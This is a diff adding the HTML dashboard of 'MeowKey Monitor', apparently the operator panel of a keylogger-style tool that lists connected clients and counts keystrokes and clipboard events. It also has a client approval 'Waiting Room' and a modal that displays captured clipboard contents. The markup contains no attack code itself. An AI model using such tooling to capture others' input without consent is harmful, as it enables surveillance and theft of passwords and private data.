@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MeowKey Monitoring Dashboard</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <h1>MeowKey Monitor</h1>
+                <p class="subtitle">Real-time Input Monitoring System</p>
+            </div>
+            <nav class="nav">
+                <a href="index.html" class="nav-link active"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+                <a href="waiting_room.html" class="nav-link"><i class="fas fa-user-clock"></i> Waiting Room</a>
+                <a href="clients.html" class="nav-link"><i class="fas fa-users"></i> Clients</a>
+                <a href="settings.html" class="nav-link"><i class="fas fa-cog"></i> Settings</a>
+                <div class="status-indicator">
+                    <span class="status-dot active"></span>
+                    <span class="status-text">Server: Online</span>
+                </div>
+            </nav>
+        </header>
+
+        <!-- Dashboard Content -->
+        <main class="main-content">
+            <div class="dashboard-header">
+                <h2>Active Monitoring Sessions</h2>
+                <div class="stats-summary">
+                    <div class="stat-card">
+                        <span class="stat-value" id="total-clients">0</span>
+                        <span class="stat-label">Active Clients</span>
+                    </div>
+                    <div class="stat-card">
+                        <span class="stat-value" id="total-keystrokes">0</span>
+                        <span class="stat-label">Keystrokes Today</span>
+                    </div>
+                    <div class="stat-card">
+                        <span class="stat-value" id="total-clipboard">0</span>
+                        <span class="stat-label">Clipboard Events</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Active Clients Grid -->
+            <div class="clients-grid" id="clients-container">
+                <!-- Client cards will be dynamically inserted here -->
+                <div class="empty-state">
+                    <i class="fas fa-user-slash"></i>
+                    <h3>No Active Clients</h3>
+                    <p>Clients will appear here once connected and approved</p>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>MeowKey Monitoring System v1.0 | Secure Connection Established</p>
+            <p class="timestamp" id="current-time"></p>
+        </footer>
+    </div>
+
+    <!-- Clipboard Modal -->
+    <div class="modal" id="clipboard-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Clipboard Content</h3>
+                <button class="close-modal" id="close-modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="clipboard-meta">
+                    <span class="client-id" id="clipboard-client-id">Client: Unknown</span>
+                    <span class="timestamp" id="clipboard-timestamp">Just now</span>
+                </div>
+                <div class="clipboard-content" id="clipboard-content">
+                    <!-- Clipboard content will appear here -->
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-secondary" id="copy-clipboard">Copy to Clipboard</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/utils.js"></script>
+    <script src="js/dashboard.js"></script>
+</body>
+</html>
